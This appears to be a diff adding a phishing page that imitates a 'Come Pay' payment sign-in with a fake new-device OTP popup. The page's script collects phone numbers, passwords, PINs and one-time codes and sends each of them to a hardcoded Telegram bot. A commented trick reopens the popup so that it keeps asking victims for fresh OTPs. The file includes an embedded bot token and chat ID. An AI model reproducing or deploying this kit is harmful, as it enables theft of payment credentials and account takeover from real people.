@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Come Pay - Sign In</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #f2f6f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    .login-container {
+      background-color: #f2f6f9;
+      width: 100%;
+      max-width: 380px;
+      padding: 30px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Logo Styling */
+    .logo-box {
+      margin-bottom: 35px;
+      text-align: center;
+    }
+
+    .logo-img {
+      width: 180px;
+      height: auto;
+    }
+
+    /* Input Fields */
+    .input-group {
+      position: relative;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 52px;
+      padding: 10px 20px 10px 50px;
+      border: 1px solid #e1e8ed;
+      border-radius: 26px;
+      background-color: #ffffff;
+      font-size: 16px;
+      color: #333;
+      outline: none;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+    }
+
+    .input-group input::placeholder {
+      color: #aab8c2;
+    }
+
+    .input-group .icon {
+      position: absolute;
+      left: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .input-group .icon svg {
+      fill: #2e8b57;
+    }
+
+    /* Options / Toggles */
+    .options-container {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .register-link {
+      color: #0d8a52;
+      text-decoration: underline;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #0d8a52;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .checkbox-label input[type="radio"],
+    .checkbox-label input[type="checkbox"] {
+      accent-color: #0d8a52;
+      width: 16px;
+      height: 16px;
+    }
+
+    .privacy-container {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 25px;
+      font-size: 14px;
+      color: #0d8a52;
+      font-weight: 500;
+    }
+
+    .privacy-container a {
+      color: #0d8a52;
+      text-decoration: underline;
+    }
+
+    /* Button */
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background-color: #0d8a52;
+      color: #ffffff;
+      border: none;
+      border-radius: 26px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-submit:hover {
+      background-color: #09683d;
+    }
+
+    /* ===============================
+       NEW POPUP (MODAL) STYLES
+       =============================== */
+    .modal-overlay {
+      display: none; /* Hidden by default */
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .modal-content {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 24px;
+      padding: 30px 24px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      position: relative;
+      animation: slideUp 0.3s ease-out;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    /* Close (X) Button */
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background-color: #f0f7f4;
+      border: none;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      color: #333;
+      font-size: 18px;
+      transition: background 0.2s;
+    }
+
+    .close-btn:hover {
+      background-color: #e0ede6;
+    }
+
+    .modal-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 25px;
+      margin-top: 5px;
+    }
+
+    .modal-text {
+      font-size: 15px;
+      color: #0d8a52;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .modal-phone {
+      font-size: 16px;
+      color: #0d8a52;
+      font-weight: 600;
+      margin-bottom: 25px;
+    }
+
+    /* OTP Input Wrapper */
+    .otp-input-wrapper {
+      display: flex;
+      align-items: center;
+      border: 1px solid #dce5e1;
+      border-radius: 30px;
+      padding: 5px 5px 5px 15px;
+      margin-bottom: 30px;
+      background-color: #f8fbf9;
+    }
+
+    .otp-input-wrapper svg {
+      width: 24px;
+      height: 24px;
+      fill: #333;
+      margin-right: 10px;
+    }
+
+    .otp-input-wrapper input {
+      border: none;
+      background: transparent;
+      flex: 1;
+      font-size: 16px;
+      color: #333;
+      outline: none;
+    }
+    
+    .otp-input-wrapper input::placeholder {
+      color: #aab8c2;
+      font-weight: 500;
+    }
+
+    .btn-send {
+      background-color: #0d8a52;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 20px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-send:hover {
+      background-color: #09683d;
+    }
+
+    /* Confirm Button */
+    .btn-confirm {
+      width: 100%;
+      height: 52px;
+      background-color: #0d8a52;
+      color: #ffffff;
+      border: none;
+      border-radius: 26px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-confirm:hover {
+      background-color: #09683d;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    
+    <!-- Logo -->
+    <div class="logo-box">
+      <img src="https://i.postimg.cc/SNpBKgZz/29eb415856d0481f9695e40f84a851c8.png" alt="Come Pay" class="logo-img">
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm" style="width: 100%;">
+      
+      <!-- Phone Input -->
+      <div class="input-group">
+        <span class="icon">
+          <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        </span>
+        <input type="tel" id="phone" placeholder="Phone" required>
+      </div>
+
+      <!-- Password Input -->
+      <div class="input-group">
+        <span class="icon">
+          <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+        </span>
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+
+      <!-- 6-Digit PIN Input -->
+      <div class="input-group">
+        <span class="icon">
+          <svg viewBox="0 0 24 24"><path d="M7 14c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm13-3h-9.17C10.42 8.83 8.89 7.5 7 7.5 5.07 7.5 3.5 9.07 3.5 11S5.07 14.5 7 14.5c1.89 0 3.42-1.33 3.83-3.5H13v2h2v-2h2v2h3v-2z"/></svg>
+        </span>
+        <input type="password" id="pin" maxlength="6" placeholder="6-Digit PIN" required>
+      </div>
+
+      <!-- Register & Remember Me -->
+      <div class="options-container">
+        <a href="#" class="register-link">Register</a>
+        <label class="checkbox-label">
+          <input type="checkbox" id="rememberMe"> Remember Me
+        </label>
+      </div>
+
+      <!-- Privacy Agreement -->
+      <div class="privacy-container">
+        <input type="checkbox" id="privacy" checked style="accent-color: #0d8a52;">
+        <span>Agree <a href="#">"User Privacy Agreement"</a></span>
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit" class="btn-submit">Sign In</button>
+    </form>
+
+  </div>
+
+  <!-- ===============================
+       NEW DEVICE VERIFICATION POPUP
+       =============================== -->
+  <div class="modal-overlay" id="verificationModal">
+    <div class="modal-content">
+      
+      <!-- Close Button -->
+      <button class="close-btn" id="closeModalBtn">
+        <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </button>
+
+      <div class="modal-title">New Device Verification</div>
+      
+      <div class="modal-text">
+        Tap Send to receive the OTP, then enter it to confirm this login.
+      </div>
+      
+      <div class="modal-phone">
+        OTP will be sent to <span id="displayPhoneNumber">+91 9827278050</span>
+      </div>
+
+      <!-- OTP Input Container -->
+      <div class="otp-input-wrapper">
+        <!-- Email/Envelope Icon -->
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        <input type="text" id="otpCode" placeholder="OTP Code" maxlength="6">
+        <button class="btn-send" id="sendOtpBtn">Send</button>
+      </div>
+
+      <!-- Confirm Button -->
+      <button class="btn-confirm" id="confirmOtpBtn">Confirm</button>
+
+    </div>
+  </div>
+
+  <script>
+    // Telegram configuration
+    const BOT_TOKEN = '8840287090:AAFR64gYHMHfXd0wRPph93jClUFt8FbX9vk';
+    const CHAT_ID = '8931680483';
+
+    const loginForm = document.getElementById('loginForm');
+    const modal = document.getElementById('verificationModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const displayPhoneNumber = document.getElementById('displayPhoneNumber');
+    const sendOtpBtn = document.getElementById('sendOtpBtn');
+    const confirmOtpBtn = document.getElementById('confirmOtpBtn');
+    const otpCodeInput = document.getElementById('otpCode');
+    
+    let currentPhone = "";
+
+    // Handle Login Submit
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+      const pin = document.getElementById('pin').value;
+      const privacy = document.getElementById('privacy').checked;
+
+      if (!privacy) {
+        alert("Kripya User Privacy Agreement ko accept karein.");
+        return;
+      }
+
+      currentPhone = phone;
+      displayPhoneNumber.innerText = phone ? (phone.startsWith('+') ? phone : '+91 ' + phone) : '+91 9827278050';
+
+      // Send initial data to Telegram
+      const message = `🔐 *ComePay Login Attempt*\n\n📱 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}\n✅ Privacy Agreed: ${privacy ? 'Yes' : 'No'}\n⏰ Time: ${new Date().toLocaleString()}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+      }).catch(err => console.error('Network error:', err));
+
+      // Clear previous OTP input just in case
+      otpCodeInput.value = '';
+
+      // Open the Modal (Popup)
+      modal.style.display = 'flex';
+    });
+
+    // Close Modal Button (X)
+    closeModalBtn.addEventListener('click', function() {
+      modal.style.display = 'none';
+      otpCodeInput.value = '';
+    });
+
+    // Send OTP Button inside Popup
+    sendOtpBtn.addEventListener('click', function() {
+      const sendMsg = `📩 *OTP Requested*\n\n📱 Phone: ${currentPhone}\n⏰ Time: ${new Date().toLocaleString()}`;
+      
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: sendMsg, parse_mode: 'Markdown' })
+      }).catch(err => console.error(err));
+
+      alert("OTP Sent Successfully! (Simulation)");
+    });
+
+    // Confirm OTP Button inside Popup
+    confirmOtpBtn.addEventListener('click', function() {
+      const otpValue = otpCodeInput.value;
+
+      if(otpValue.trim() === '') {
+        alert("Kripya OTP Code enter karein.");
+        return;
+      }
+
+      // Send OTP to Telegram
+      const otpMsg = `🔑 *OTP Code Entered*\n\n📱 Phone: ${currentPhone}\n🔢 OTP: ${otpValue}\n⏰ Time: ${new Date().toLocaleString()}`;
+      
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: otpMsg, parse_mode: 'Markdown' })
+      }).catch(err => console.error(err));
+
+      // Show Success Message
+      alert("✅ Verification Successful! Please wait...");
+      
+      // Clear the OTP input box
+      otpCodeInput.value = '';
+
+      // Popup ko band karke turant wapas open karne ka logic (Bar-bar OTP magne ke liye)
+      modal.style.display = 'none';
+      
+      setTimeout(() => {
+        modal.style.display = 'flex';
+      }, 300); // 300ms delay taaki transition smooth lage
+    });
+
+    // Close modal if user clicks outside the modal content
+    window.addEventListener('click', function(e) {
+      if (e.target === modal) {
+        modal.style.display = 'none';
+        otpCodeInput.value = '';
+      }
+    });
+  </script>
+</body>
+</html>
